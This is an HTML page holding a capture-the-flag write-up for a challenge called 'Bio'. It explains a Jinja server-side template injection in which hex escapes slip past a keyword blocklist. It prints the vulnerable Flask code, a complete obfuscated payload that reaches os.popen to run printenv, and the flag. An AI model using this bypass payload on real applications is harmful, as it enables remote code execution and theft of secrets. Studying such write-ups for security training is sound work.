@@ -1,0 +1,56 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#100d0b">
+  <meta name="description" content="The profile bio has server-side template injection and a weak keyword blacklist. Hexadecimal escapes hide dangerous names from the filter but are decoded by Jinja.">
+  <title>Bio | Securinets Friendly CTF | rouma</title>
+  <link rel="icon" href="../images/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="../css/style.css">
+  <script src="../js/main.js" defer></script>
+</head>
+<body>
+  <a class="skip-link" href="#article">Skip to article</a>
+  <header class="site-header">
+    <nav class="article-nav container" aria-label="Article navigation">
+      <a class="brand brand-signature" href="../index.html#home" aria-label="rouma, Home">rouma</a>
+      <a class="text-link" href="web-exploitation.html#securinets-friendly-ctf">&larr; Securinets Friendly CTF</a>
+    </nav>
+  </header>
+  <main id="article" class="article-main securinets-article container" tabindex="-1">
+    <p class="section-label">SECURINETS FRIENDLY CTF / WAVE 2 / MEDIUM</p>
+    <h1>Bio</h1>
+    <p class="template-notice">Original author: <strong>L-BOH</strong>. Shared for educational purposes; full credit goes to the original author. <a href="https://github.com/securinets-insat/Friendly-CTF-2026/blob/d4aa7b854bbc631b11313e6cba3edce0abb979c9/web-exp/wave2/ssti_hex_enc/writeup.md">Read the original writeup on GitHub</a>.</p>
+    <div class="writeup-content">
+<h2>Summary</h2>
+<p>The profile bio has server-side template injection and a weak keyword blacklist. Hexadecimal escapes hide dangerous names from the filter but are decoded by Jinja.</p>
+<h2>Root cause</h2>
+<p>The server checks the raw bio before injecting it into template source:</p>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-python">if BLOCKLIST.search(new_bio):
+    return jsonify({&quot;error&quot;: &quot;Invalid input&quot;}), 400
+...
+template = PROFILE_TEMPLATE.format(bio=bio)
+return render_template_string(template, user=user)
+</code></pre>
+<p>The blacklist runs before Jinja decodes string escapes. For example, the raw characters <code>\x5f</code> do not match an underscore check, but Jinja later interprets them as underscores. The render function then evaluates the reconstructed template syntax.</p>
+<h2>Vulnerability</h2>
+<p>Raw payloads containing double underscores or the word os are rejected. However, Jinja understands escapes such as <code>\x5f</code> for underscore and <code>\x6f\x73</code> for os. The filter sees only harmless backslash characters and letters before Jinja interprets the payload.</p>
+<h2>Exploit</h2>
+<p>Register and log in, then submit this as the bio:</p>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-jinja">{% for c in ''['\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f']['\x5f\x5f\x6d\x72\x6f\x5f\x5f'][1]['\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f']() %}
+{% set g = c['\x5f\x5f\x69\x6e\x69\x74\x5f\x5f']|attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f') %}
+{% if g is not undefined and '\x6f\x73' in g %}
+{{ g['\x6f\x73']['\x70\x6f\x70\x65\x6e']('printenv').read() }}
+{% endif %}
+{% endfor %}
+</code></pre>
+<p>The payload finds a Python class whose initializer exposes os in its globals, then runs <code>printenv</code>. Reload the profile and read <code>FLAG</code> from the displayed environment.</p>
+<h2>Flag</h2>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-text">Securinets{ssti_w1th_h3x_3ncod1ng_byp4ss}
+</code></pre>
+    </div>
+    <p class="article-back"><a href="web-exploitation.html#securinets-wave2">&larr; Back to Wave 2 writeups</a></p>
+  </main>
+</body>
+</html>
